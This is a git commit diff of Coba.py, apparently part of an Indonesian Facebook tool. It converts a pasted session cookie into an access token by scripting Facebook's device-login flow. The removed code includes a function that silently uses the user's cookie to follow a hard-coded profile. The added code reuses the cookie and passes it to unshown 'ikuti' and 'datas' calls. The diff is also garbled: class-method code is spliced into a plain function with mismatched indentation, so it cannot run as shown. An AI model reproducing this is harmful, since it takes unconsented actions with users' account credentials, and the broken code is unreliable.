8c13cc71bffb9cc04652b230f9a0335c8d84e22a
GreynoooXD <137965161+GreynoooXD@users.noreply.github.com>
2023-12-01 23:31:21 +0800

    Add files via upload

--- Coba.py
+++ Coba.py
@@ -211,75 +211,36 @@ def login_lagi334():
 		your_cookies = input(' [+] Masukan Cookie : ')
 		with requests.Session() as r:
 			try:
-				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
-				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
-				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
-				code, user_code = response['code'], response['user_code']
-				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
-				r.headers.pop('content-type')
-				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
-				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
-				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
-				else:
-					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
-					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
-					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
-					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
-					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
-					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
-					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
-						r.headers.pop('content-type');r.headers.pop('origin')
-						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
-						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
-						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
-						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
-						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
-						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
-						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
-						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
-						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
-						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
-						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
-						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
-						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
-						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
-						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
-						r.headers.pop('content-type');r.headers.pop('origin')
-						r.headers.update({'referer': 'https://m.facebook.com/',})
-						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
-						if 'Sukses!' in str(response6):
-							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
-							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
-							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n [+] Token : {access_token}")
-							tokenew = open(".token.txt","w").write(access_token)
-							cook= open(".cok.txt","w").write(your_cookies)
-							os.system("xdg-open https://chat.whatsapp.com/InwlvDU3t6d9FShXwfH2MV")
-							print("\n [+] Login Berhasil | python BrayennnFB.py");followdong()
-			except Exception as e:
-				print(" [+] Cookies Mokad Kontol")
-				os.system('rm -rf .token.txt && rm -rf .cok.txt')
-				print(e)
-				time.sleep(3)
-				exit()
-	except:pass
-
-def followdong():
-	try:
-		token = open('.token.txt','r').read()
-		cokies = open('.cok.txt','r').read()
-	except IOError:
-		print(' [+] Cookies Kadaluarsa ')
-		time.sleep(5)
-		login()
-	myuid = ('100001571125775')
-	try:
-		for foll in parser(requests.get(f'https://mbasic.facebook.com/'+myuid,cookies={'cookie':cokies}).text,'html.parser').find_all('a',href=True):
-			if '/a/subscribe.php?' in foll.get('href'):
-				x=requests.get('https://mbasic.facebook.com'+foll['href'],cookies = {'cookie':cokies}).text
-				exit()
-	except(Exception)as e:print(e)#< Response error
+				sleep(3);self.___login___()
+            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
+            if 'href="/zero/optin/write/' in str(link):
+                Console(width=70).print(Panel(f'{P2}akun facebook anda sedang menggunakan mode free',style=f"bold white",padding=(0,9)))
+                Console(width=70).print(Panel(f'{P2}mohon tunggu sebentar system sedang mengubah cookie ke mode data',style=f"bold white",padding=(0,2)))
+                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
+                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
+                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
+                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
+                self.ses.post(f"{self.url}{poss}", data = date, cookies = {"cookie": cok}).text
+                self.__UbahNgaranKontol__({"cookie": cok})
+                console.print(f' {P2}[{H2}✓{P2}] proses mengubah ke mode data telah selesai.\n {P2}[{H2}+{P2}] silahkan masukan ulang cookie nya dengan mengetik python run.py')
+                sleep(3);sys.exit()
+            elif 'href="/x/checkpoint/' in str(link):
+                console.print(f' {P2}[{M2}!{P2}] opshh cookie anda chekcpoint')
+                sleep(3);self.___login___()
+            elif 'href="/r.php' in str(link):
+                console.print(f' {P2}[{M2}!{P2}] cookie yang anda masukan invalid')
+                sleep(3);self.___login___()
+            else:
+                self.anim()
+                self.__UbahNgaranKontol__({"cookie": cok})
+                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
+                user = re.search("c_user=(\d+)", str(cok)).group(1)
+                open('data/cookie.json', 'w').write(cok);open('data/token.json', 'w').write(f"{nama}|{user}")
+                console.print(f' {P2}[{H2}+{P2}] selamat datang {H2}{nama} {P2}mohon gunakan tools dengan bijak');self.ikuti({"cookie": cok});self.datas(nama, cok)
+                sleep(5);self.menu()
+        except requests.ConnectionError as e:
+            Console(width=70).print(Panel(f'''{M2}{str(e).title()}''',style=f"bold white",padding=(0,4)))
+            sleep(3);sys.exit()
 #------------------[ BAGIAN-MENU ]----------------#
 def menu(my_name,my_id):
 	try:
